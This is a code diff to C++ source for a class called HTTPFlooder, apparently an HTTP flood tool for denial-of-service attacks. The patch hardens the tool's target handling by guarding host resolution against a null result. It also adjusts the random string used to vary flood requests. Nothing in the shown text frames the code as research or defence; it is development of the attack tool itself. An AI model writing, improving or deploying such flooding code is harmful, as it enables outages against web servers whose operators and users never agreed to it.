@@ -31,31 +31,36 @@ HTTPFlooder::HTTPFlooder(int fid, const char *ip, int port, int delay, const cha
 		if (!pIp)
 		{
 			struct hostent *he = gethostbyname(host);
-			if (he == NULL)
+			if (he)
+			{
+				in_addr *addr = (in_addr *)he->h_addr;
+				pIp = inet_ntoa(*addr); // don't care about the data, will not use it anymore
+			}
+			else
 				bRunning = false;
-	
-			in_addr *addr = (in_addr *)he->h_addr;
-			pIp = inet_ntoa(*addr); // don't care about the data, will not use it anymore
-		}
-		
-		memset(&sAddress, '\0', sizeof(sAddress));
-		sAddress.sin_family = AF_INET;
-		sAddress.sin_addr.s_addr = inet_addr(pIp);
-		sAddress.sin_port = htons(port);
-	
-		char *nh = const_cast<char *>(host);
-		char *p = const_cast<char *>(strstr(host, "http://"));
-		if (p)
-		{
-			nh = p + strlen("http://");
 		}
 
-		char *host2 = strdup(nh);
-		p = strstr(host2, "/");
-		
-		pHost = host2;
-		if (p)
-			pHost[p - host2] = '\0';
+		if (bRunning)
+			{
+			memset(&sAddress, '\0', sizeof(sAddress));
+			sAddress.sin_family = AF_INET;
+			sAddress.sin_addr.s_addr = inet_addr(pIp);
+			sAddress.sin_port = htons(port);
+	
+			char *nh = const_cast<char *>(host);
+			char *p = const_cast<char *>(strstr(host, "http://"));
+			if (p)
+			{
+				nh = p + strlen("http://");
+			}
+
+			char *host2 = strdup(nh);
+			p = strstr(host2, "/");
+
+			pHost = host2;
+			if (p)
+				pHost[p - host2] = '\0';
+		}
 	}
 	else
 	{
@@ -82,10 +87,10 @@ bool HTTPFlooder::Run()
 		char response[64];
 		request[0] = '\0';
 
-		char str[20];
+		char str[21];
 		if (bRandom)
 		{
-			for (int i = 0; i < 20; i++)
+			for (int i = 0; i < 21; i++)
 			{
 				str[i] = get_random_valid_char();
 			}
